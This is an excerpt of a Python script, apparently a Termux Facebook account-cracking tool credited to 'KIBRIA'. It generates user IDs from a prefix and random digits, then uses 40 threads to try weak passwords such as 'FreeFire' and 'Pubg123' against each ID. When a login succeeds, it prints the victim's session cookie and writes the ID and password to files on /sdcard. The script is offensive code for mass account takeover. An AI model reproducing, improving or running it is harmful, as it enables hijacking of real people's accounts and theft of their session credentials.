...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] KIBRIA\033[1;39m            ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] KIBRIA x KIBRIA CHOWDHURY\033[1;39m   ┃
...
def KIBRIA():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    KIBRIA = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if KIBRIA in ["1","A"]:
        KIBRIAs()
    if KIBRIA in ["2","B"]:
        os.system('xdg-open https://www.facebook.com/groups/230673489802359/?ref=share_group_link')
    if KIBRIA in ["3","C"]:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100069340471587&mibextid=ZbWKwL')
    if KIBRIA in ["0","X"]:
        os.system('exit')
...
def KIBRIAs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m MACK BY KIBRIA x TANJID ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(KIBRIAm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM KIBRIA ')
    print("\033[1;91m╚═══════════════════════════╝")


def KIBRIAm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mKIBRIA-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/KIBRIA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[KIBRIA-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/KIBRIA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
